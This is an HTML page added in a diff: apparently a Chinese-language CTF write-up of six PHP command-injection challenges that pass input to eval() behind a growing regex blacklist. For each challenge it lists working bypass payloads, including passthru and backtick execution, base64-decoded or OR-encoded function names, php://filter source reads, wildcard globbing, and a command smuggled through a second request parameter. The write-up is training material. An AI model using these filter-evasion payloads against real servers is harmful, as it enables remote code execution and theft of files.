@@ -1,0 +1,193 @@
+<h1 id="指令绕过"><a href="#指令绕过" class="headerlink" title="指令绕过"></a>指令绕过</h1><h1 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h1><pre><code class="language-php">&lt;?php
+# flag in config.php
+include(&quot;config.php&quot;);
+if(isset($_GET[&#39;c&#39;])){
+        $c = $_GET[&#39;c&#39;];
+        if(preg_match(&quot;/system|exec|highlight/i&quot;,$c)){
+                eval($c);
+        }else{
+            die(&quot;cmd error&quot;);
+        }
+}else{
+        highlight_file(__FILE__);
+}
+?&gt;
+</code></pre>
+<blockquote>
+<p>只要满足正则表达式中的，这串代码将进行eval($c)，eval这个函数会将字符串当作php代码执行</p>
+</blockquote>
+<blockquote>
+<p>方法一：?c&#x3D;system(‘cat config.php’);</p>
+</blockquote>
+<blockquote>
+<p>方法二：?c&#x3D;echo shell_exec(‘cat config.php’);</p>
+</blockquote>
+<blockquote>
+<p>方法三：?c&#x3D;highlight_file(‘config.php’);</p>
+</blockquote>
+<blockquote>
+<p>方法四：?c&#x3D;echo shell_exec(‘sed -n p config.php’);</p>
+</blockquote>
+<blockquote>
+<p>方法五：?c&#x3D;exec(‘cat config.php’, $output, $ret);echo ($output)[1];</p>
+</blockquote>
+<p>‍</p>
+<h1 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h1><pre><code class="language-php">&lt;?php
+# flag in config.php
+include(&quot;config.php&quot;);
+if(isset($_GET[&#39;c&#39;])){
+        $c = $_GET[&#39;c&#39;];
+        if(!preg_match(&quot;/system|exec|highlight/i&quot;,$c)){
+                eval($c);
+        }else{
+            die(&quot;cmd error&quot;);
+        }
+}else{
+        highlight_file(__FILE__);
+}
+?&gt;
+</code></pre>
+<blockquote>
+<p>由于正则表达式改为不匹配了!preg_match，那么我们将不能用这三个函数，还可以用passthru这个函数，这个可以直接输出在浏览器上?c&#x3D;passthru(‘cat config.php’);,还有一个比较神奇的php为什么直接输出flag?c&#x3D;echo $flag;</p>
+</blockquote>
+<blockquote>
+<p>方法一：</p>
+<p>PHP 支持一个执行运算符：反引号（``）。注意这不是单引号！PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。 因此可以构造linux命令输出config.php文件</p>
+<pre><code>?c=echo `tac config.php`;
+</code></pre>
+<p>tac命令倒序输出文件，在页面就能看到结果flag。 如果用cat命令，正序输出，因为被认为是PHP文件，所以需要在F12网络请求里看响应。还可以用这个函数得到内容c&#x3D;echo file_get_contents(‘config.php’);</p>
+</blockquote>
+<blockquote>
+<p>方法二：php伪协议读取文件?c&#x3D;include(‘php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;config.php’); 直接查看源码</p>
+<p>?c=show_source(‘config.php’);</p>
+</blockquote>
+<blockquote>
+<p>方法三：print_r();可以使用，?c=print_r(get_defined_vars()); 在数组中取出当前已定义的变量，本来是想传参到post绕过get的过滤机制system的，但是取出定义参数的时候，被定义好的flag参数也顺带被取出来了。</p>
+</blockquote>
+<blockquote>
+<p>方法四：拼接绕过，限制函数system，构造?c=$a=‘sys’;$b=‘tem’;$d=$a.$b;$d(‘cat config.php’);</p>
+</blockquote>
+<blockquote>
+<p>方法五：可以用get方式:?c=echo $_GET[1];&amp;1=tac config.php<br>可以用post方式:?c=echo $_POST[1];然后在Post data中写入1=tac config.php</p>
+</blockquote>
+<blockquote>
+<p>方法六：使用或运算模式绕过限制，F12查看源码?c&#x3D;(“%13%19%13%14%05%0d”|”%60%60%60%60%60%60”)(“%03%01%14%00%03%0f%0e%06%09%07%00%10%08%10”|”%60%60%60%20%60%60%60%60%60%60%2e%60%60%60”);</p>
+</blockquote>
+<p>‍</p>
+<h1 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h1><pre><code class="language-php">&lt;?php
+# flag in config.php
+include(&quot;config.php&quot;);
+if(isset($_GET[&#39;c&#39;])){
+        $c = $_GET[&#39;c&#39;];
+        if(!preg_match(&quot;/system|exec|highlight|cat|\.|php|config/i&quot;,$c)){
+                eval($c);
+        }else{
+            die(&quot;cmd error&quot;);
+        }
+}else{
+        highlight_file(__FILE__);
+}
+?&gt;
+</code></pre>
+<blockquote>
+<p>不难看出，这一次仅用了cat命令，‘.’和php还有config，那么我们就要想办法绕过才行，符号*有猜测的作用</p>
+</blockquote>
+<blockquote>
+<p>可以用*符号来猜测补全不用完整的congfig和php，还有可以用tac不用cat就行，，system被禁用，老样子我们用passthru，还可以用print_r</p>
+</blockquote>
+<blockquote>
+<p>另类的解题方法 根据报错获得路径信息&#x2F;var&#x2F;www&#x2F;html c&#x3D;$a&#x3D;opendir(%27&#x2F;var&#x2F;www&#x2F;html%27);$e&#x3D;readdir($a);$e&#x3D;readdir($a);$e&#x3D;readdir($a);echo%20readfile($e);</p>
+</blockquote>
+<blockquote>
+<p>可以用base64编码来绕过c&#x3D;$a&#x3D;base64_decode(‘c3lzdGVt’);$b&#x3D;base64_decode(‘Y2F0IGNvbmZpZy5waHA&#x3D;’);$a($b);</p>
+</blockquote>
+<blockquote>
+<p>cat 还有 less more head tac tali</p>
+</blockquote>
+<p>‍</p>
+<h1 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h1><pre><code class="language-php">&lt;?php
+# flag in config.php
+include(&quot;config.php&quot;);
+if(isset($_GET[&#39;c&#39;])){
+        $c = $_GET[&#39;c&#39;];
+        if(!preg_match(&quot;/system|exec|highlight|cat|\.|\;|file|php|config/i&quot;,$c)){
+                eval($c);
+        }else{
+            die(&quot;cmd error&quot;);
+        }
+}else{
+        highlight_file(__FILE__);
+}
+?&gt;
+</code></pre>
+<blockquote>
+<p>发现居然连分号都禁用了，php中?&gt;闭合了前面的<?，代表代码结束，因此最后一行是可以不需要分号的 ②?c=passthru('tac c*')?></p>
+</blockquote>
+<blockquote>
+<p>通过伪协议获取 题目已经明确告知答案在config.php payload: &#x2F;?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;config.php</p>
+</blockquote>
+<p>‍</p>
+<h1 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h1><pre><code class="language-php">&lt;?php
+# flag in config.php
+include(&quot;config.php&quot;);
+if(isset($_GET[&#39;c&#39;])){
+        $c = $_GET[&#39;c&#39;];
+        if(!preg_match(&quot;/system|exec|highlight|cat|\(|\.|\;|file|php|config/i&quot;,$c)){
+                eval($c);
+        }else{
+            die(&quot;cmd error&quot;);
+        }
+}else{
+        highlight_file(__FILE__);
+}
+?&gt;
+</code></pre>
+<blockquote>
+<p>发现这一次有点离谱，居然把小括号给引用了，那么有一些函数就用不了了，不过我们要记住php中&#96;&#96;直接代表指令</p>
+</blockquote>
+<blockquote>
+<p>那么我们就不用（）的函数，我们使用	?c&#x3D;echo `tac con*`?&gt;</p>
+</blockquote>
+<blockquote>
+<p>也可以直接echo找到flag</p>
+</blockquote>
+<blockquote>
+<p>当然还可以用伪协议</p>
+<p>涉及到一个php的代码结构，<?php $_GET[a];?>…..②payload为：?c&#x3D;include $_GET[a]?&gt;，等同于<?php include $_GET[a]?>，php的最后一行代码可以省去分号…..③include函数包含文件，且题目是对参数c正则过滤，因此GET型传参a可以绕过，从而执行我们的伪协议文件命令，读取config.php文件：php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;config.php④因此连起来构造的payload为：</p>
+</blockquote>
+<blockquote>
+<p>也可以&#x2F;?c&#x3D;echo <code>$_GET[a]</code>​?&gt;&amp;a&#x3D;cat config.php 让其echo一个get请求，?&gt;闭合，请求内容为cat config.php</p>
+</blockquote>
+<p>‍</p>
+<h1 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h1><pre><code class="language-php">
+&lt;?php
+# flag in config.php
+include(&quot;config.php&quot;);
+if(isset($_GET[&#39;c&#39;])){
+        $c = $_GET[&#39;c&#39;];
+        if(!preg_match(&quot;/system|\\*|\?|\&lt;|\&gt;|\=|exec|highlight|cat|\(|\.|file|php|config/i&quot;,$c)){
+                eval($c);
+        }else{
+            die(&quot;cmd error&quot;);
+        }
+}else{
+        highlight_file(__FILE__);
+}
+?&gt;
+</code></pre>
+<blockquote>
+<p>新增了*，？，&lt;&gt;，&#x3D;的过滤，这样就不能用?&gt;结尾了，</p>
+</blockquote>
+<blockquote>
+<p>但是还可以可以用get和post,?c&#x3D;echo`$_GET[1]`;&amp;1&#x3D;tac “config.php”</p>
+</blockquote>
+<blockquote>
+<p>?c&#x3D;echo <code>$_POST[a]</code>​; BP 截断，修改为POST, 增加参数 a&#x3D; cat config.php</p>
+</blockquote>
+<blockquote>
+<p>只禁用了*和?常用通配符，还可以使用其他通配符[c1-c2],[!c1-c2],[list]等 payload：?c&#x3D;echo <code>tac confi[g][!0-9]ph[p]</code>​;</p>
+</blockquote>
+<blockquote>
+<p>?a&#x3D;cat config.php&amp;c&#x3D;echo<code>$_REQUEST[a]</code>​; ?a&#x3D;cat config.php&amp;c&#x3D;echo<code>$_GET[a]</code>​; 解析：php语言中，使用get、post传参，参数保存在超级变量$_REQUEST[a]、$_POST[a]、$_REQUEST[a]中。我们向REQUEST[a]传入文件名（因为如果写入c，会被过滤），然后向c传入执行_REQUEST[a]的代码。 另外，我们也可以通过burp抓包，以post方法将变量传入到a；通过get方法，向c传入执行代码。</p>
+</blockquote>
+<p>‍</p>
